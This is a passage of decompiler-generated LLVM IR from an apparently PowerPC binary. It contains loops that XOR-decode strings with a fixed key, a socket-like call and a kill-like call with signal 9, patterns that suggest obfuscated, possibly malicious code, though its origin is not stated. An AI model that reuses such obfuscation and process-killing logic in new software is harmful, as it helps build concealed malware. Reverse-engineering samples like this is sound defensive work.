  uselistorder i8 %v2_1000842c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_100084b4, { 1, 2, 0 }
  uselistorder i32 %v2_100084b0, { 1, 0 }
  uselistorder i32 %v1_100083c0, { 1, 0 }
  uselistorder i32 %v3_100083bc, { 1, 0 }
  uselistorder i8 %v2_100083bc, { 2, 3, 1, 0 }
  uselistorder i32 %v1_100084a8, { 1, 2, 0 }
  uselistorder i32 %v2_100084a4, { 2, 1, 0 }
  uselistorder i32 %v1_100083a0, { 1, 0, 2 }
  uselistorder i8 %v2_10008464, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10008460, { 1, 2, 0 }
  uselistorder i32 %v0_1000843038, { 2, 0, 1 }
  uselistorder i32 %v0_10008478132, { 1, 0 }
  uselistorder i32 %v1_10008438130, { 1, 0 }
  uselistorder i32 %v1_10008414, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %v3_100083f4, { 1, 0 }
  uselistorder i8 %v2_100083f4, { 2, 3, 0, 1 }
  uselistorder i32 %v2_100083f0, { 1, 2, 0 }
  uselistorder i32 %v0_100083c028, { 2, 0, 1 }
  uselistorder i32 %v0_10008408117, { 1, 0 }
  uselistorder i32 %v0_1000840c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_100083a09, { 2, 1, 0 }
  uselistorder i32 %v0_10008310, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10008300, { 1, 0 }
  uselistorder i32 %v1_100082ac, { 1, 0 }
  uselistorder i32 %v4_100082a8, { 1, 0 }
  uselistorder i32 %v1_100082a8, { 1, 2, 0 }
  uselistorder i32 %v3_100082a4, { 2, 1, 0 }
  uselistorder i32 %v1_10008258, { 1, 0 }
  uselistorder i32 %v0_10008258, { 1, 0 }
  uselistorder i32 %v1_10008248, { 1, 0 }
  uselistorder i32 %v1_10008244, { 1, 0 }
  uselistorder i8 %v2_100080d0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_100080cc, { 1, 0 }
  uselistorder i32 %v0_100080c4, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10008094, { 0, 2, 1 }
  uselistorder i32 %v2_10008090, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v0_1000802c, { 1, 0 }
  uselistorder i16* %stack_var_-2108, { 1, 0 }
  uselistorder i16 %tmp60, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 11, 12, 16, 13, 21, 22, 14, 15, 17, 18, 20, 19 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r25.global-to-local, { 1, 2, 4, 3, 0, 6, 5, 7 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 4, 6, 3, 15, 5, 14, 8, 9, 10, 12, 13, 11, 7 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 12, 13, 8, 30, 10, 11, 29, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 8, 9, 3, 4, 6, 5, 1, 7 }
  uselistorder i8 -65, { 2, 0, 3, 1 }
  uselistorder i32 65535, { 53, 54, 19, 20, 55, 56, 9, 8, 7, 57, 58, 22, 23, 24, 10, 11, 59, 25, 60, 26, 61, 0, 12, 62, 63, 27, 28, 29, 64, 65, 66, 67, 68, 69, 30, 31, 70, 71, 72, 73, 74, 75, 32, 33, 1, 13, 76, 77, 34, 35, 36, 37, 2, 14, 78, 79, 38, 39, 40, 41, 42, 80, 15, 43, 44, 81, 16, 45, 46, 3, 17, 82, 83, 5, 47, 48, 49, 4, 18, 84, 85, 6, 50, 51, 52, 21, 86 }
  uselistorder i32 (i32)* @function_1000cce4, { 8, 2, 10, 9, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 2048, { 3, 0, 1, 2, 5, 4, 6 }
  uselistorder i16 1, { 2, 3, 0, 1, 4 }
  uselistorder i32 53, { 1, 0 }
  uselistorder label %dec_label_pc_10008528, { 1, 0 }
  uselistorder label %dec_label_pc_10008494, { 1, 0 }
  uselistorder label %dec_label_pc_10008398.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10008478, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008444, { 1, 0 }
  uselistorder label %dec_label_pc_10008444.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008408, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100083d4, { 1, 0 }
  uselistorder label %dec_label_pc_100083d4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100083b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000831c, { 1, 0 }
  uselistorder label %dec_label_pc_10008308, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100082e8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10008240.dec_label_pc_10008240_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100081bc, { 1, 0 }
  uselistorder label %dec_label_pc_100080f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100080d0, { 1, 0 }
}

define i32 @function_10008540(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008540:
  %v3_10008554 = load i32, i32* @global_var_1001eb44.184, align 4
  store i32 268469596, i32* @lr, align 4
  %v2_10008558 = call i32 @function_1000b510(i32 %v3_10008554, i32 9)
  ret i32 %v2_10008558
}

define i32 @function_1000856c() local_unnamed_addr {
dec_label_pc_1000856c:
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10008574 = load i32, i32* @r31, align 4
  %v0_10008578 = load i32, i32* @r3, align 4
  store i32 %v0_10008578, i32* @r31, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10008588 = add i32 %v0_10008578, 4
  %v2_10008588 = inttoptr i32 %v1_10008588 to i32*
  %v3_10008588 = load i32, i32* %v2_10008588, align 4
  %v3_10008590 = icmp eq i32 %v3_10008588, -1
  br i1 %v3_10008590, label %dec_label_pc_100085a8, label %dec_label_pc_100085a4

dec_label_pc_100085a4:                            ; preds = %dec_label_pc_1000856c
  store i32 268469672, i32* @lr, align 4
  %v0_100085a4 = call i32 @function_1000b3f0()
  br label %dec_label_pc_100085a8

dec_label_pc_100085a8:                            ; preds = %dec_label_pc_1000856c, %dec_label_pc_100085a4
  store i32 268469688, i32* @lr, align 4
  %v3_100085b4 = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  store i32 256, i32* @r4, align 4
  %v0_100085c0 = load i32, i32* @r31, align 4
  %v1_100085c0 = add i32 %v0_100085c0, 28
  store i32 %v1_100085c0, i32* @r3, align 4
  %v3_100085c4 = icmp eq i32 %v3_100085b4, -1
  %v2_100085c8 = add i32 %v0_100085c0, 4
  %v3_100085c8 = inttoptr i32 %v2_100085c8 to i32*
  store i32 %v3_100085b4, i32* %v3_100085c8, align 4
  br i1 %v3_100085c4, label %dec_label_pc_100085a8.dec_label_pc_10008640_crit_edge, label %dec_label_pc_100085d0

dec_label_pc_100085a8.dec_label_pc_10008640_crit_edge: ; preds = %dec_label_pc_100085a8
  %v0_10008654.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008640

dec_label_pc_100085d0:                            ; preds = %dec_label_pc_100085a8
  %v0_100085d0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100085d0 = load i32, i32* @r31, align 4
  %v2_100085d0 = add i32 %v1_100085d0, 24
  %v3_100085d0 = inttoptr i32 %v2_100085d0 to i32*
  store i32 %v0_100085d0, i32* %v3_100085d0, align 4
  store i32 268469720, i32* @lr, align 4
  %v0_100085d4 = call i32 @function_1000ac0c()
  %v0_100085d8 = load i32, i32* @r31, align 4
  %v1_100085d8 = add i32 %v0_100085d8, 4
  %v2_100085d8 = inttoptr i32 %v1_100085d8 to i32*
  %v3_100085d8 = load i32, i32* %v2_100085d8, align 4
  store i32 %v3_100085d8, i32* %r29.global-to-local, align 4
  store i32 3, i32* @r4, align 4
  store i32 268469744, i32* @lr, align 4
  %v2_100085ec = call i32 @function_1000b2c0(i32 %v3_100085d8)
  store i32 4, i32* @r4, align 4
  store i32 268469764, i32* @lr, align 4
  %v2_10008600 = call i32 @function_1000b2c0(i32 %v3_100085d8)
  %v3_10008608 = load i32, i32* @global_var_1001eb38.185, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_10008610 = load i32, i32* @r31, align 4
  %v2_10008618 = add i32 %v0_10008610, 8
  %v3_10008618 = inttoptr i32 %v2_10008618 to i32*
  store i32 %v3_10008608, i32* %v3_10008618, align 4
  %v0_10008620 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008620 = load i32, i32* @r31, align 4
  %v2_10008620 = add i32 %v1_10008620, 12
  %v3_10008620 = inttoptr i32 %v2_10008620 to i32*
  store i32 %v0_10008620, i32* %v3_10008620, align 4
  %v0_10008628 = load i32, i32* @r31, align 4
  %v1_10008628 = add i32 %v0_10008628, 4
  %v2_10008628 = inttoptr i32 %v1_10008628 to i32*
  %v3_10008628 = load i32, i32* %v2_10008628, align 4
  store i32 %v3_10008628, i32* @r3, align 4
  %v1_1000862c = add i32 %v0_10008628, 16
  %v2_1000862c = inttoptr i32 %v1_1000862c to i32*
  %v3_1000862c = load i32, i32* %v2_1000862c, align 4
  store i32 %v3_1000862c, i32* %r9.global-to-local, align 4
  store i32 268469824, i32* @lr, align 4
  %v0_1000863c = call i32 @function_1000bfbc()
  br label %dec_label_pc_10008640

dec_label_pc_10008640:                            ; preds = %dec_label_pc_100085a8.dec_label_pc_10008640_crit_edge, %dec_label_pc_100085d0
  %v0_10008654 = phi i32 [ %v0_10008654.pre, %dec_label_pc_100085a8.dec_label_pc_10008640_crit_edge ], [ %v0_1000863c, %dec_label_pc_100085d0 ]
  store i32 %v0_10008574, i32* @r31, align 4
  ret i32 %v0_10008654

; uselistorder directives
  uselistorder i32 ()* @function_1000ac0c, { 6, 11, 16, 15, 14, 13, 12, 10, 9, 8, 7, 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_10008640, { 1, 0 }
  uselistorder label %dec_label_pc_100085a8, { 1, 0 }
}

define i32 @function_10008658(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008658:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000865c = load i32, i32* @lr, align 4
  store i32 %v0_1000865c, i32* %r0.global-to-local, align 4
  %v3_10008668 = load i32, i32* @global_var_1001eb2c.186, align 4
  %v1_10008674 = mul i32 %v3_10008668, 16
  store i32 %v1_10008674, i32* %r9.global-to-local, align 4
  %v0_10008678 = load i32, i32* @r28, align 4
  %v3_10008680 = load i32, i32* @global_var_1001eb30.187, align 4
  store i32 %arg2, i32* %r23.global-to-local, align 4
  %v1_1000868c = add i32 %v1_10008674, 16
  %v0_100086a4 = load i32, i32* @r29, align 4
  %v0_100086a8 = load i32, i32* @r30, align 4
  store i32 268469940, i32* @lr, align 4
  %v3_100086b0 = call i32 @function_1000c6b8(i32 %v3_10008680, i32 %v1_1000868c, i32 %v1_10008674)
  store i32 %v3_100086b0, i32* %r25.global-to-local, align 4
  %v0_100086b8 = load i32, i32* @r28, align 4
  store i32 %v3_100086b0, i32* @global_var_1001eb30.187, align 4
  %v3_100086c0 = load i32, i32* @global_var_1001eb2c.186, align 4
  store i32 %v3_100086c0, i32* %r24.global-to-local, align 4
  store i32 268469960, i32* @lr, align 4
  %v1_100086c4 = inttoptr i32 %v0_100086b8 to i8*
  %v2_100086c4 = call i32 @function_1000ab64(i8* %v1_100086c4)
  %sext = mul i32 %v2_100086c4, 16777216
  %v1_100086c8 = sdiv i32 %sext, 16777216
  %v2_100086c8 = add nsw i32 %v1_100086c8, 1
  store i32 %v2_100086c8, i32* @r29, align 4
  store i32 %v1_100086c8, i32* @r30, align 4
  store i32 %v2_100086c8, i32* @r3, align 4
  store i32 268469976, i32* @lr, align 4
  %v0_100086d4 = call i32 @function_1000c3f0()
  %v0_100086d8 = load i32, i32* @r28, align 4
  %v0_100086dc = load i32, i32* @r29, align 4
  store i32 %v0_100086d4, i32* %r31.global-to-local, align 4
  store i32 268469992, i32* @lr, align 4
  %v3_100086e4 = call i32 @function_1000abe8(i32 %v0_100086d8, i32 %v0_100086dc, i32 %v0_100086dc)
  %v0_100086e8 = load i32, i32* @r30, align 4
  %tmp21 = icmp slt i32 %v0_100086e8, 1
  %extract.t6 = trunc i32 %v0_100086e8 to i8
  br i1 %tmp21, label %dec_label_pc_1000870c, label %dec_label_pc_100086f0

dec_label_pc_100086f0:                            ; preds = %dec_label_pc_10008658
  store i32 %v0_100086e8, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100086f8

dec_label_pc_100086f8:                            ; preds = %dec_label_pc_100086f8, %dec_label_pc_100086f0
  %v1_10008700 = phi i32 [ %v1_10008704, %dec_label_pc_100086f8 ], [ 0, %dec_label_pc_100086f0 ]
  %v1_100086f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100086f8 = add i32 %v1_100086f8, %v1_10008700
  %v3_100086f8 = inttoptr i32 %v2_100086f8 to i8*
  %v4_100086f8 = load i8, i8* %v3_100086f8, align 1
  %v5_100086f8 = zext i8 %v4_100086f8 to i32
  %v1_100086fc = xor i32 %v5_100086f8, 34
  store i32 %v1_100086fc, i32* %r0.global-to-local, align 4
  %v3_10008700 = trunc i32 %v1_100086fc to i8
  store i8 %v3_10008700, i8* %v3_100086f8, align 1
  %v0_10008704 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008704 = add i32 %v0_10008704, 1
  store i32 %v1_10008704, i32* %r9.global-to-local, align 4
  %v0_10008708 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008708 = add i32 %v0_10008708, -1
  store i32 %v1_10008708, i32* %ctr.global-to-local, align 4
  %v2_10008708 = icmp eq i32 %v1_10008708, 0
  br i1 %v2_10008708, label %dec_label_pc_1000870c.loopexit, label %dec_label_pc_100086f8

dec_label_pc_1000870c.loopexit:                   ; preds = %dec_label_pc_100086f8
  %v0_10008724.pre = load i32, i32* @r30, align 4
  %extract.t = trunc i32 %v0_10008724.pre to i8
  br label %dec_label_pc_1000870c

dec_label_pc_1000870c:                            ; preds = %dec_label_pc_1000870c.loopexit, %dec_label_pc_10008658
  %v0_10008724.off0 = phi i8 [ %extract.t, %dec_label_pc_1000870c.loopexit ], [ %extract.t6, %dec_label_pc_10008658 ]
  %v3_1000870c = load i32, i32* @global_var_1001eb2c.186, align 4
  %v0_10008710 = load i32, i32* %r23.global-to-local, align 4
  %v3_10008714 = load i32, i32* @global_var_1001eb30.187, align 4
  %v1_10008718 = mul i32 %v3_1000870c, 16
  %v2_1000871c = add i32 %v3_10008714, %v1_10008718
  store i32 %v2_1000871c, i32* %r9.global-to-local, align 4
  %v0_10008720 = load i32, i32* %r24.global-to-local, align 4
  %v1_10008720 = mul i32 %v0_10008720, 16
  store i32 %v1_10008720, i32* %r0.global-to-local, align 4
  %v3_10008724 = add i32 %v2_1000871c, 12
  %v4_10008724 = inttoptr i32 %v3_10008724 to i8*
  store i8 %v0_10008724.off0, i8* %v4_10008724, align 1
  %v0_10008728 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008728 = load i32, i32* %r25.global-to-local, align 4
  %v2_10008728 = load i32, i32* %r0.global-to-local, align 4
  %v3_10008728 = add i32 %v2_10008728, %v1_10008728
  %v4_10008728 = inttoptr i32 %v3_10008728 to i32*
  store i32 %v0_10008728, i32* %v4_10008728, align 4
  %v3_1000872c = load i32, i32* @global_var_1001eb2c.186, align 4
  store i32 %v3_1000872c, i32* @r30, align 4
  %v3_10008730 = load i32, i32* @global_var_1001eb30.187, align 4
  store i32 %v3_10008730, i32* %r25.global-to-local, align 4
  store i32 268470072, i32* @lr, align 4
  %v1_10008734 = inttoptr i32 %v0_10008710 to i8*
  %v2_10008734 = call i32 @function_1000ab64(i8* %v1_10008734)
  %sext1 = mul i32 %v2_10008734, 16777216
  %v1_10008738 = sdiv i32 %sext1, 16777216
  %v2_10008738 = add nsw i32 %v1_10008738, 1
  store i32 %v2_10008738, i32* @r29, align 4
  store i32 %v1_10008738, i32* @r28, align 4
  store i32 %v2_10008738, i32* @r3, align 4
  store i32 268470088, i32* @lr, align 4
  %v0_10008744 = call i32 @function_1000c3f0()
  %v0_10008748 = load i32, i32* %r23.global-to-local, align 4
  %v0_1000874c = load i32, i32* @r29, align 4
  store i32 %v0_10008744, i32* %r31.global-to-local, align 4
  store i32 268470104, i32* @lr, align 4
  %v3_10008754 = call i32 @function_1000abe8(i32 %v0_10008748, i32 %v0_1000874c, i32 %v0_1000874c)
  %v0_10008758 = load i32, i32* @r28, align 4
  %tmp22 = icmp slt i32 %v0_10008758, 1
  %extract.t8 = trunc i32 %v0_10008758 to i8
  br i1 %tmp22, label %dec_label_pc_1000877c, label %dec_label_pc_10008760

dec_label_pc_10008760:                            ; preds = %dec_label_pc_1000870c
  store i32 %v0_10008758, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008768

dec_label_pc_10008768:                            ; preds = %dec_label_pc_10008768, %dec_label_pc_10008760
  %v1_10008770 = phi i32 [ %v1_10008774, %dec_label_pc_10008768 ], [ 0, %dec_label_pc_10008760 ]
  %v1_10008768 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008768 = add i32 %v1_10008768, %v1_10008770
  %v3_10008768 = inttoptr i32 %v2_10008768 to i8*
  %v4_10008768 = load i8, i8* %v3_10008768, align 1
  %v5_10008768 = zext i8 %v4_10008768 to i32
  %v1_1000876c = xor i32 %v5_10008768, 34
  store i32 %v1_1000876c, i32* %r0.global-to-local, align 4
  %v3_10008770 = trunc i32 %v1_1000876c to i8
  store i8 %v3_10008770, i8* %v3_10008768, align 1
  %v0_10008774 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008774 = add i32 %v0_10008774, 1
  store i32 %v1_10008774, i32* %r9.global-to-local, align 4
  %v0_10008778 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008778 = add i32 %v0_10008778, -1
  store i32 %v1_10008778, i32* %ctr.global-to-local, align 4
  %v2_10008778 = icmp eq i32 %v1_10008778, 0
  br i1 %v2_10008778, label %dec_label_pc_1000877c.loopexit, label %dec_label_pc_10008768

dec_label_pc_1000877c.loopexit:                   ; preds = %dec_label_pc_10008768
  %v0_10008790.pre = load i32, i32* @r28, align 4
  %extract.t7 = trunc i32 %v0_10008790.pre to i8
  br label %dec_label_pc_1000877c

dec_label_pc_1000877c:                            ; preds = %dec_label_pc_1000877c.loopexit, %dec_label_pc_1000870c
  %v0_10008790.off0 = phi i8 [ %extract.t7, %dec_label_pc_1000877c.loopexit ], [ %extract.t8, %dec_label_pc_1000870c ]
  %v3_1000877c = load i32, i32* @global_var_1001eb2c.186, align 4
  %v3_10008784 = load i32, i32* @global_var_1001eb30.187, align 4
  %v1_10008788 = mul i32 %v3_1000877c, 16
  %v2_1000878c = or i32 %v1_10008788, 13
  %v3_10008790 = add i32 %v2_1000878c, %v3_10008784
  %v4_10008790 = inttoptr i32 %v3_10008790 to i8*
  store i8 %v0_10008790.off0, i8* %v4_10008790, align 1
  %v0_10008794 = load i32, i32* @r30, align 4
  %v1_10008794 = mul i32 %v0_10008794, 16
  %v1_10008798 = load i32, i32* %r25.global-to-local, align 4
  %v2_10008798 = add i32 %v1_10008798, %v1_10008794
  store i32 %v2_10008798, i32* %r9.global-to-local, align 4
  %v3_1000879c = load i32, i32* @global_var_1001eb2c.186, align 4
  %v3_100087a0 = load i32, i32* @global_var_1001eb30.187, align 4
  %v1_100087a4 = mul i32 %v3_1000879c, 16
  %v3_100087a8 = load i16, i16* @global_var_1001eb34.188, align 2
  %v4_100087a8 = zext i16 %v3_100087a8 to i32
  store i32 %v4_100087a8, i32* %r7.global-to-local, align 4
  %v2_100087ac = add i32 %v3_100087a0, %v1_100087a4
  store i32 %v2_100087ac, i32* %r11.global-to-local, align 4
  store i32 %v0_1000865c, i32* %r0.global-to-local, align 4
  %v1_100087b4 = add i32 %v3_1000879c, 1
  store i32 %v1_100087b4, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_1001eb34.188 to i32), i32* %r8.global-to-local, align 4
  %v0_100087bc = load i32, i32* %r31.global-to-local, align 4
  %v2_100087bc = add i32 %v2_10008798, 4
  %v3_100087bc = inttoptr i32 %v2_100087bc to i32*
  store i32 %v0_100087bc, i32* %v3_100087bc, align 4
  %v0_100087c4 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100087c4, i32* @global_var_1001eb2c.186, align 4
  store i32 %v0_10008678, i32* @r28, align 4
  store i32 %v0_100086a4, i32* @r29, align 4
  store i32 %v0_100086a8, i32* @r30, align 4
  %v0_100087f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100087f4 = trunc i32 %v0_100087f4 to i16
  %v2_100087f4 = load i32, i32* %r11.global-to-local, align 4
  %v3_100087f4 = add i32 %v2_100087f4, 10
  %v4_100087f4 = inttoptr i32 %v3_100087f4 to i16*
  store i16 %v1_100087f4, i16* %v4_100087f4, align 2
  %v0_100087f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100087f8 = trunc i32 %v0_100087f8 to i16
  %v2_100087f8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100087f8 = add i32 %v2_100087f8, 8
  %v4_100087f8 = inttoptr i32 %v3_100087f8 to i16*
  store i16 %v1_100087f8, i16* %v4_100087f8, align 2
  %v0_100087fc = load i32, i32* %r8.global-to-local, align 4
  %v1_100087fc = trunc i32 %v0_100087fc to i16
  store i16 %v1_100087fc, i16* @global_var_1001eb34.188, align 2
  ret i32 %v3_10008754

; uselistorder directives
  uselistorder i32 %v3_1000879c, { 1, 0 }
  uselistorder i32 %v1_10008778, { 1, 0 }
  uselistorder i32 %v1_10008774, { 1, 0 }
  uselistorder i32 %v0_10008758, { 1, 0, 2 }
  uselistorder i32 %v1_10008708, { 1, 0 }
  uselistorder i32 %v1_10008704, { 1, 0 }
  uselistorder i32 %v0_100086e8, { 1, 0, 2 }
  uselistorder i32 %v1_10008674, { 2, 1, 0 }
  uselistorder i32* %r23.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i8*)* @function_1000ab64, { 28, 29, 8, 9, 10, 11, 12, 27, 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 76, 79, 80, 77, 78, 81, 82, 83, 84, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 70, 71, 72, 73, 74, 75, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32 (i32, i32, i32)* @function_1000c6b8, { 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
}

define i32 @function_10008804() local_unnamed_addr {
dec_label_pc_10008804:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp59 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %tmp62 = call i16 @__decompiler_undefined_function_1()
  %tmp63 = call i8 @__decompiler_undefined_function_2()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1904 = alloca i32, align 4
  %stack_var_-1896 = alloca i32, align 4
  %stack_var_-1892 = alloca i32, align 4
  %stack_var_-1728 = alloca i32, align 4
  %stack_var_-1856 = alloca i32, align 4
  %stack_var_-1912 = alloca i32, align 4
  %stack_var_-1600 = alloca i32, align 4
  %stack_var_-1872 = alloca i32, align 4
  %stack_var_-1580 = alloca i16, align 2
  %stack_var_-1900 = alloca i64, align 8
  %v0_10008804 = load i32, i32* @lr, align 4
  store i32 %v0_10008804, i32* %r0.global-to-local, align 4
  %v0_1000882c = load i32, i32* @r22, align 4
  %v0_10008830 = load i32, i32* @r23, align 4
  %v0_10008834 = load i32, i32* @r24, align 4
  %v0_10008838 = load i32, i32* @r25, align 4
  %v0_1000883c = load i32, i32* @r26, align 4
  %v0_10008844 = load i32, i32* @r28, align 4
  %v0_10008848 = load i32, i32* @r29, align 4
  %v0_10008850 = load i32, i32* @r31, align 4
  store i32 268470364, i32* @lr, align 4
  %v0_10008858 = call i32 @function_1000b438()
  store i32 %v0_10008858, i32* %r3.global-to-local, align 4
  %v1_1000885c = icmp slt i32 %v0_10008858, 0
  %v3_1000885c = icmp eq i32 %v0_10008858, 0
  store i1 %v1_1000885c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000885c, i1* %cr7_eq.global-to-local, align 1
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v0_10008858, i32* @global_var_1001eb44.184, align 4
  %tmp105 = icmp slt i32 %v0_10008858, 1
  br i1 %tmp105, label %dec_label_pc_100088c4, label %dec_label_pc_1000886c

dec_label_pc_1000886c:                            ; preds = %dec_label_pc_100088c4, %dec_label_pc_10008804
  store i32 %v0_10008804, i32* %r0.global-to-local, align 4
  store i32 %v0_1000882c, i32* @r22, align 4
  store i32 %v0_10008830, i32* @r23, align 4
  store i32 %v0_10008834, i32* @r24, align 4
  store i32 %v0_10008838, i32* @r25, align 4
  store i32 %v0_1000883c, i32* @r26, align 4
  store i32 %v0_10008844, i32* @r28, align 4
  store i32 %v0_10008848, i32* @r29, align 4
  store i32 %v0_10008850, i32* @r31, align 4
  ret i32 %v0_10008858

dec_label_pc_100088c4:                            ; preds = %dec_label_pc_10008804
  %v1_100088c4 = icmp slt i32 %v0_10008858, -1
  %v3_100088c4 = icmp eq i32 %v0_10008858, -1
  store i1 %v1_100088c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100088c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100088c4, label %dec_label_pc_1000886c, label %dec_label_pc_100088cc

dec_label_pc_100088cc:                            ; preds = %dec_label_pc_100088c4
  store i32 268470480, i32* @lr, align 4
  %v1_100088cc = call i32 @function_1000ae68(i32 %v0_10008858)
  store i32 %v1_100088cc, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v1_100088cc, i32* @global_var_1001eb10.71, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100088dc.189 to i32), i32* @lr, align 4
  %v1_100088d8 = call i32 @function_10007cf8(i32 %v1_100088cc)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268470504, i32* @lr, align 4
  %v0_100088e4 = call i32 @function_1000b7c0()
  store i32 288, i32* %r4.global-to-local, align 4
  store i32 %v0_100088e4, i32* @global_var_1001eb38.185, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100088f8.190 to i32), i32* @lr, align 4
  %v2_100088f4 = call i32 @function_1000c548(i32 256, i32 288)
  store i32 %v2_100088f4, i32* %r3.global-to-local, align 4
  store i64 0, i64* %stack_var_-1900, align 8
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 256, i32* %ctr.global-to-local, align 4
  store i32 %v2_100088f4, i32* @global_var_1001eb3c.191, align 4
  store i32 %v2_100088f4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10008924 = add i32 %v2_100088f4, 4
  store i32 %v1_10008924, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008928

dec_label_pc_10008928:                            ; preds = %dec_label_pc_10008928.dec_label_pc_10008928_crit_edge, %dec_label_pc_100088cc
  %v1_1000893c = phi i32 [ %v1_10008944, %dec_label_pc_10008928.dec_label_pc_10008928_crit_edge ], [ %v1_10008924, %dec_label_pc_100088cc ]
  %v0_1000893c = phi i32 [ %v0_1000893c.pre, %dec_label_pc_10008928.dec_label_pc_10008928_crit_edge ], [ -1, %dec_label_pc_100088cc ]
